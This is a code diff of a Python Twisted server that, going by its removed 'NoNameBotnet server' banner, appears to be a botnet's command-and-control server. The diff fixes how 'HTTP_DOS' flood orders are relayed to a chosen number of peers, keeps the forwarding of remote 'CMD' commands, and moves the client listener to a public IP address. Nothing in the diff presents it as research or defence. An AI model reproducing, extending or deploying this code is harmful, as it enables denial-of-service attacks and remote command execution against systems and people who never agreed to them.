@@ -72,13 +72,12 @@ class peerFactory(protocol.Factory):
                         max_peers = int(msg[1])
                         n_peers = 1
                         logging.debug('Sending ddos request...')
+                        msg_to_send = 'HTTP_DOS:' + ddos_msg
                         for peer_id, connection in self.peers.items():
                             if n_peers <= max_peers:
-                                ddos_msg = 'HTTP_DOS' + ddos_msg
-                                self.peers[peer_id].transport.write(ddos_msg.encode('utf-8'))
+                                self.peers[peer_id].transport.write(msg_to_send.encode('utf-8'))
                                 n_peers += 1
                         peer_msg.remove(message)
-                    
                     else:
                         peer_msg.remove(message)
                 
@@ -108,7 +107,7 @@ class echoClient(protocol.Protocol):
                 #1 - host | 2 - command
                 message = '::'.join(['CMD', p_data[1], p_data[2]])
                 peer_msg.append(message)
-                self.startBroadcast()
+                self.broadcast()
             elif msg_type == 'DDOS':
                 ddos_msg = ':'.join([p_data[2], p_data[3]])
                 max_peers = p_data[1]
@@ -122,8 +121,8 @@ class echoClient(protocol.Protocol):
             pass
 
     #Broadcast data to client
-    def startBroadcast(self): 
-        def broadcast():
+    def broadcast(self): 
+        def run():
             global client_msg
             if client_msg:
                 app_client_msg = client_msg
@@ -133,7 +132,7 @@ class echoClient(protocol.Protocol):
                     client_msg.remove(msg)
                 looping_call.stop()
 
-        looping_call = LoopingCall(broadcast)
+        looping_call = LoopingCall(run)
         looping_call.start(0.1)
 
 class clientFactory(protocol.Factory):
@@ -141,17 +140,9 @@ class clientFactory(protocol.Factory):
         return echoClient()
  
 if __name__ == '__main__':
-    print("""\
-    _   __      _   __                     ____        __             __ 
-   / | / /___  / | / /___ _____ ___  ___  / __ )____  / /_____  ___  / /_
-  /  |/ / __ \/  |/ / __ `/ __ `__ \/ _ \/ __  / __ \/ __/ __ \/ _ \/ __/
- / /|  / /_/ / /|  / /_/ / / / / / /  __/ /_/ / /_/ / /_/ / / /  __/ /_  
-/_/ |_/\____/_/ |_/\__,_/_/ /_/ /_/\___/_____/\____/\__/_/ /_/\___/\__/  
-                                                      ______ _____  _____ ____
-                                                     (_-< -_) __/ |/ / -_) __/
-                                                    /___|__/_/  |___/\__/_/   
-    """)
-    endpoints.serverFromString(reactor, "tcp:8081:interface=127.0.0.1").listen(peerFactory())
-    endpoints.serverFromString(reactor, "tcp:8080:interface=127.0.0.1").listen(clientFactory())
+    #TODO implement a sort of authentication to the server to avoi request from other clients
+    endpoints.serverFromString(reactor, "tcp:8080:interface=127.0.0.1").listen(peerFactory())
+    endpoints.serverFromString(reactor, "tcp:8443:interface=167.99.194.11").listen(clientFactory())
+    print("Server running");
     logger.start()
     reactor.run()
